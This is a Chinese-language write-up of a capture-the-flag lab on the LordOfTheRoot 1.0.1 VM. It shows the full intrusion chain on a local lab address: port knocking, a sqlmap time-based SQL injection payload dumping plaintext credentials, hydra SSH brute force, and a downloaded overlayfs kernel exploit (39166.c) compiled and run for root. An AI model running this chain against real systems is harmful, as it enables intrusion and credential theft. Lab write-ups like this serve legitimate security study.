---
title: LordOfTheRoot_1.0.1
date: 2024年6月30日
updated: 2024年6月30日
tags:
  - 靶场
categories: 靶场
keywords:
description: LordOfTheRoot_1.0.1

---
6-LordOfTheRoot_1.0.1

# 信息收集

经典nmap扫描但是这个很奇怪只开放了22端口

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.159.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:06 CST
Nmap scan report for 192.168.159.1
Host is up (0.00011s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.159.2
Host is up (0.00017s latency).
MAC Address: 00:50:56:E1:64:0A (VMware)
Nmap scan report for 192.168.159.135
Host is up (0.00034s latency).
MAC Address: 00:0C:29:65:E0:CF (VMware)
Nmap scan report for 192.168.159.254
Host is up (0.00025s latency).
MAC Address: 00:50:56:E3:A8:9B (VMware)
Nmap scan report for 192.168.159.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.97 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.159.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:06 CST
Nmap scan report for 192.168.159.135
Host is up (0.00062s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
MAC Address: 00:0C:29:65:E0:CF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (89%), Linux 3.13 - 3.16 (87%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 192.168.159.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.67 seconds

```

使用ssh链接一下
```
┌──(kali㉿kali)-[~]
└─$ ssh 192.168.159.135
The authenticity of host '192.168.159.135 (192.168.159.135)' can't be established.
ED25519 key fingerprint is SHA256:Rz24fg01xp2jMdwk9c44ijnZAz1uaUlvRXX7QU+ERtI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.159.135' (ED25519) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
kali@192.168.159.135's password:
Permission denied, please try again.
kali@192.168.159.135's password:
Permission denied, please try again.
kali@192.168.159.135's password:
kali@192.168.159.135: Permission denied (publickey,password).


```

这里说要easy as 1,2,3

看了一下wp，这里是个[端口碰撞](https://blog.csdn.net/moxuansheng/article/details/2478899)


```
                                                                             ┌──(kali㉿kali)-[~]
└─$ hping3 -S 192.168.159.135 -c  1 -p 1
[open_sockraw] socket(): Operation not permitted
[main] can't open raw socket

┌──(kali㉿kali)-[~]
└─$ hping3 -S 192.168.159.135 -c  1 -p 1
[open_sockraw] socket(): Operation not permitted
[main] can't open raw socket

┌──(kali㉿kali)-[~]
└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 1
[sudo] kali 的密码：
HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes

--- 192.168.159.135 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

┌──(kali㉿kali)-[~]
└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 2
HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes

--- 192.168.159.135 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

┌──(kali㉿kali)-[~]
└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 3
HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes

--- 192.168.159.135 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms


```

刚开始怎么弄都不行

后来灵机一动是不是要root权限

结果还真成了

~~这个故事告诉我们，别瞎搜，搜出来的都是叫重装的~~

再扫一次

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.159.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:35 CST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 66.89% done; ETC: 18:37 (0:00:38 remaining)
Nmap scan report for 192.168.159.135
Host is up (0.00030s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:65:E0:CF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (87%), Linux 3.13 - 3.16 (87%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.30 ms 192.168.159.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.05 seconds
```
扫面出来一个1337端口，需要注意的是需要完成端口碰撞的机器才能访问这个，所以我们要在虚拟机中进行访问

是个小孩骑狗的图片，扫了一下后台发现

```

┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.159.135:1337

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Jun 30 18:47:11 2024
URL_BASE: http://192.168.159.135:1337/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.159.135:1337/ ----
==> DIRECTORY: http://192.168.159.135:1337/images/
+ http://192.168.159.135:1337/index.html (CODE:200|SIZE:64)
+ http://192.168.159.135:1337/server-status (CODE:403|SIZE:297)

---- Entering directory: http://192.168.159.135:1337/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sun Jun 30 18:47:14 2024
DOWNLOADED: 4612 - FOUND: 2
```
存在```/usr/share/dirb/wordlists/common.txt```
访问一下

是这么一个图片，没有东西，看一下源码好像存在base64


两次解码以后得到```/978345210/index.php```

访问，发现是一个登录框，怀疑有sql注入或者xss这种，先上sqlmap试试

--forms 在目标URL上解析和测试表单

--dbs  爆库

--tables  爆表

--column  爆列


[sqlmap语句大全](https://blog.csdn.net/Breeze_CAT/article/details/80628392)
```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:53:12 /2024-06-30/

[18:53:12] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=0ppebngpp01...d0jo0k3ga3'). Do you want to use those [Y/n] Y
[18:53:13] [INFO] searching for forms
[1/1] Form:
POST http://192.168.159.135:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[18:53:13] [INFO] resuming back-end DBMS 'mysql'
[18:53:13] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06302024_0653pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=xUrz' AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND 'etoh'='etoh&password=QvOd&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[18:53:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[18:53:13] [INFO] fetching database names
[18:53:13] [INFO] fetching number of databases
[18:53:13] [INFO] resumed: 4
[18:53:13] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:53:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[18:53:28] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[18:54:23] [INFO] retrieved: Webapp
[18:54:43] [INFO] retrieved: mysql
[18:54:59] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

[18:55:55] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06302024_0653pm.csv'

[*] ending @ 18:55:54 /2024-06-30/


┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:57:04 /2024-06-30/

[18:57:04] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=mb384e2a6cu...015s6ft4k2'). Do you want to use those [Y/n] Y
[18:57:04] [INFO] searching for forms
[1/1] Form:
POST http://192.168.159.135:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[18:57:04] [INFO] resuming back-end DBMS 'mysql'
[18:57:04] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06302024_0657pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=xUrz' AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND 'etoh'='etoh&password=QvOd&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[18:57:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[18:57:04] [INFO] fetching tables for database: 'Webapp'
[18:57:04] [INFO] fetching number of tables for database 'Webapp'
[18:57:04] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[18:57:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[18:57:09] [INFO] retrieved:
[18:57:19] [INFO] adjusting time delay to 1 second due to good response times
Users
Database: Webapp
[1 table]
+-------+
| Users |
+-------+

[18:57:32] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06302024_0657pm.csv'

[*] ending @ 18:57:32 /2024-06-30/


┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp -T User
s --columns
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.6.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:42 /2024-06-30/

[18:58:42] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=glencc0t31r...q0mgrpu8v1'). Do you want to use those [Y/n] Y
[18:58:42] [INFO] searching for forms
[1/1] Form:
POST http://192.168.159.135:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[18:58:42] [INFO] resuming back-end DBMS 'mysql'
[18:58:42] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06302024_0658pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=xUrz' AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND 'etoh'='etoh&password=QvOd&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[18:58:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[18:58:42] [INFO] fetching columns for table 'Users' in database 'Webapp'
[18:58:42] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[18:58:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:58:58] [INFO] adjusting time delay to 1 second due to good response times
3
[18:58:58] [INFO] retrieved: id
[18:59:04] [INFO] retrieved: int(10)
[18:59:28] [INFO] retrieved: username
[18:59:50] [INFO] retrieved: varchar(255)
[19:00:27] [INFO] retrieved: password
[19:00:54] [INFO] retrieved: varchar(255)
Database: Webapp
Table: Users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[19:01:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06302024_0658pm.csv'

[*] ending @ 19:01:31 /2024-06-30/

```


最后得到

database：Webapp

table：Users

columns：id，username，password

在根据得到的爆破账号密码

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp -T Users -C id,password,username --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.6.3#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:15:23 /2024-06-30/

[19:15:23] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=955enk5hbde...c9l0ccfri3'). Do you want to use those [Y/n] Y
[19:15:23] [INFO] searching for forms
[1/1] Form:
POST http://192.168.159.135:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[19:15:24] [INFO] resuming back-end DBMS 'mysql'
[19:15:24] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06302024_0715pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=xUrz' AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND 'etoh'='etoh&password=QvOd&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[19:15:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[19:15:24] [INFO] fetching entries of column(s) 'id,password,username' for table 'Users' in database 'Webapp'
[19:15:24] [INFO] fetching number of column(s) 'id,password,username' entries for table 'Users' in database 'Webapp'
[19:15:24] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[19:15:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
5
[19:15:34] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[19:15:39] [INFO] adjusting time delay to 1 second due to good response times
1
[19:15:40] [INFO] retrieved: iwilltakethering
[19:16:29] [INFO] retrieved: frodo
[19:16:48] [INFO] retrieved: 2
[19:16:51] [INFO] retrieved: MyPreciousR00t
[19:17:38] [INFO] retrieved: smeagol
[19:17:59] [INFO] retrieved: 3
[19:18:02] [INFO] retrieved: AndMySword
[19:18:40] [INFO] retrieved: aragorn
[19:19:00] [INFO] retrieved: 4
[19:19:04] [INFO] retrieved: AndMyBow
[19:19:35] [INFO] retrieved: legolas
[19:19:57] [INFO] retrieved: 5
[19:20:00] [INFO] retrieved: AndMyAxe
[19:20:30] [INFO] retrieved: gimli
Database: Webapp
Table: Users
[5 entries]
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | iwilltakethering | frodo    |
| 2  | MyPreciousR00t   | smeagol  |
| 3  | AndMySword       | aragorn  |
| 4  | AndMyBow         | legolas  |
| 5  | AndMyAxe         | gimli    |
+----+------------------+----------+

[19:20:45] [INFO] table 'Webapp.Users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.159.135/dump/Webapp/Users.csv'
[19:20:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06302024_0715pm.csv'

[*] ending @ 19:20:45 /2024-06-30/


```
获得账号密码


wp说登进去看看没啥东西，但到我这里登都登不进去，

气笑了


把账号密码保存下来，用hydra爆破

```
┌──(kali㉿kali)-[~/桌面]
└─$ hydra -L user.txt -P pass.txt 192.168.159.135 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-30 19:45:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.159.135:22/
[22][ssh] host: 192.168.159.135   login: smeagol   password: MyPreciousR00t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 19:45:18

```


爆出来了，ssh登录看一下身份以及权限

```
┌──(kali㉿kali)-[~/桌面]
└─$ ssh smeagol@192.168.159.135

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
smeagol@192.168.159.135's password:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

601 packages can be updated.
440 updates are security updates.

                            .____    _____________________________
                            |    |   \_____  \__    ___/\______   \
                            |    |    /   |   \|    |    |       _/
                            |    |___/    |    \    |    |    |   \
                            |_______ \_______  /____|    |____|_  /
                                    \/       \/                 \/
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ |
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ |
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ |
       \/       \/          \/            \/     \/       \/                  \/     \/      \/
Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
smeagol@LordOfTheRoot:~$ whoami
smeagol
smeagol@LordOfTheRoot:~$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
smeagol@LordOfTheRoot:~$ uname -a
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
smeagol@LordOfTheRoot:~$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
smeagol@LordOfTheRoot:~$

```
系统是
```
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```
可以搜搜有没有提权的,我想的是ubuntu内核提权，但是今天累了不想写了，明天继续(bushi)

ok魂斗罗归来

搜了一下有一个39166.c的，上exploitsearch找了一下
复制到kali

```
┌──(kali㉿kali)-[~]
└─$ searchsploit 39166
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local | linux/local/39166.c
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

用python启一个服务器，从服务器下载39166.c
```
┌──(root㉿kali)-[/home/kali]
└─# python -m http.server 5555
Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
192.168.159.135 - - [10/Jul/2024 16:20:28] "GET /39166.c HTTP/1.1" 200 -
```


编译成可执行文件直接运行，提权成功
```
smeagol@LordOfTheRoot:~$ wget 192.168.159.129:5555/39166.c
--2024-06-30 06:35:11--  http://192.168.159.129:5555/39166.c
Connecting to 192.168.159.129:5555... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2680 (2.6K) [text/x-csrc]
Saving to: ‘39166.c’

100%[====================================================>] 2,680       --.-K/s   in 0s

2024-06-30 06:35:11 (123 MB/s) - ‘39166.c’ saved [2680/2680]

smeagol@LordOfTheRoot:~$ ls
39166.c  Documents  examples.desktop  Pictures  Templates
Desktop  Downloads  Music             Public    Videos
smeagol@LordOfTheRoot:~$ gcc 39166.c -o shell
smeagol@LordOfTheRoot:~$ ls
39166.c  Documents  examples.desktop  Pictures  shell      Videos
Desktop  Downloads  Music             Public    Templates
smeagol@LordOfTheRoot:~$ ./shell
root@LordOfTheRoot:~#

```


说是还有个缓冲区溢出的，但是我没看懂。。。。

[LordOfTheRoot_1.0.1](https://blog.csdn.net/qq_34801745/article/details/103792018)


等我后面学了再回来